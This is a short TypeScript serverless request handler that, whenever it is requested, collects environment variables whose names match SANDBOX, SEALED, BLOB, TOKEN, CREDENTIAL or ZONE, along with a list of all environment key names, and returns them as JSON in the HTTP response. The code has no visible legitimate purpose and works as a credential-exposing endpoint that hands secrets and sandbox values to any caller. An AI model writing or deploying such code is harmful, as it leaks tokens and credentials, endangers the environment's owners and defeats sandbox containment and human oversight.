export async function onRequest(context: any): Promise<Response> {
  const env = process.env;
  const pick = {};
  for (const k of Object.keys(env)) {
    if (/SANDBOX|SEALED|BLOB|TOKEN|CREDENTIAL|ZONE/i.test(k)) pick[k] = env[k];
  }
  return new Response(JSON.stringify({ sandboxKeys: pick, allKeys: Object.keys(env) }, null, 1), { headers: { "Content-Type": "application/json" } });
}
